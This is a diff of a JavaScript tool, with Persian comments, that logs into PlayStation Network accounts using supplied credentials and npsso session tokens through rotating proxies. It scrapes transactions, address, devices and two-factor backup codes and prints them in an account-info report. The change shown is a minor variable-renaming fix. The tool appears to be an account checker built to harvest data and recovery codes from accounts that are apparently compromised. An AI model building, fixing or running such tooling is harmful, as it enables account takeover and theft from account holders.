@@ -131,7 +131,7 @@ const fetchApiData = async (allCookies, finalResponses, onProgress) => {
                 ].join(",")
             },
             processData: (data) => ({
-                transactionNumbers: data.transactions.length,
+                transactionNumbers: data.transactions?.length || 0,
                 trans: data.transactions
                     .filter(t => (t.additionalInfo?.orderItems?.[0]?.totalPrice &&
                         Math.abs(t.additionalInfo.orderItems[0].totalPrice.value) > 0) ||
@@ -441,7 +441,7 @@ async function findWorkingProxy(proxyData, proxyFile, onProgress) {
 async function runPsnApiTool(options) {
     const {
         credentials,
-        npsso,
+        npsso: initialNpsso,
         proxyFile,
         proxyData,
         onProgress = () => { },
@@ -452,6 +452,7 @@ async function runPsnApiTool(options) {
 
     let finalResponses = {};
     let proxyConfig = null;
+    let currentNpsso = initialNpsso;  
 
     if (proxyData) {
         proxyConfig = await findWorkingProxy(proxyData, proxyFile, onProgress);
@@ -485,7 +486,7 @@ async function runPsnApiTool(options) {
 
         // تنظیم صفحه اول
         let page1 = await createConfiguredPage(
-            browser, null, npsso, CONSTANTS.TARGET_URLS, finalResponses,
+            browser, null, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
             CONSTANTS.PAGE_CONFIGS.FIRST.name, onProgress, onData, proxyConfig
         );
         await navigateToPage(page1, CONSTANTS.PAGE_CONFIGS.FIRST.url, "صفحه اول", onProgress);
@@ -526,10 +527,10 @@ async function runPsnApiTool(options) {
 
                 if (finalResponses.newNpsso) {
                     logProgress(`استفاده از NPSSO جدید: ${finalResponses.newNpsso.substring(0, 5)}...`, onProgress);
-                    npsso = finalResponses.newNpsso;
+                    currentNpsso = finalResponses.newNpsso;  // تغییر متغیر محلی به جای پارامتر
                     await page1.close();
                     page1 = await createConfiguredPage(
-                        browser, null, npsso, CONSTANTS.TARGET_URLS, finalResponses,
+                        browser, null, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
                         CONSTANTS.PAGE_CONFIGS.FIRST.name, onProgress, onData, proxyConfig
                     );
                     await navigateToPage(page1, CONSTANTS.PAGE_CONFIGS.FIRST.url, "صفحه اول (با NPSSO جدید)", onProgress);
@@ -546,7 +547,7 @@ async function runPsnApiTool(options) {
         const hasNpsso = cookies.some(cookie => cookie.name === "npsso");
         if (!hasNpsso) {
             logProgress("کوکی npsso یافت نشد؛ اضافه کردن دستی", onProgress);
-            cookies.push(CookieUtils.createNpssoCookie(npsso));
+            cookies.push(CookieUtils.createNpssoCookie(currentNpsso));
         }
 
         // کلیک روی عناصر منو
@@ -590,7 +591,7 @@ async function runPsnApiTool(options) {
 
         // تنظیم صفحه دوم
         const page2 = await createConfiguredPage(
-            browser, cookies, npsso, CONSTANTS.TARGET_URLS, finalResponses,
+            browser, cookies, currentNpsso, CONSTANTS.TARGET_URLS, finalResponses,
             CONSTANTS.PAGE_CONFIGS.SECOND.name, onProgress, onData, proxyConfig
         );
         await navigateToPage(page2, CONSTANTS.PAGE_CONFIGS.SECOND.url, "صفحه دوم", onProgress);
@@ -633,7 +634,7 @@ async function runPsnApiTool(options) {
         finalResponses = await fetchApiData(allCookies, finalResponses, onProgress);
 
         // اجرای اسکریپت پایتون برای دریافت دستگاه‌ها
-        const pythonProcess = spawn("python3", ["get_devices.py", npsso]);
+        const pythonProcess = spawn("python3", ["get_devices.py", currentNpsso]);
         let result = "";
         let error = "";
 
@@ -659,7 +660,7 @@ async function runPsnApiTool(options) {
                 const output = `
 ----------------------- « Account Info » -----------------------
 - Account : ${credentials}
-- Npsso : ${npsso}
+- Npsso : ${currentNpsso}
 - Backup Codes :  [ ${finalResponses.backupCodes ? finalResponses.backupCodes.join(" - ") : "N/A"} ]
 --------------------------- « Details » --------------------------
 - Country | City | Postal Code : ${countryCode ? (countries.find(item => item.code === countryCode)).name : "N/A"} - ${finalResponses.address?.city || "N/A"} - ${finalResponses.address?.postalCode || "N/A"}
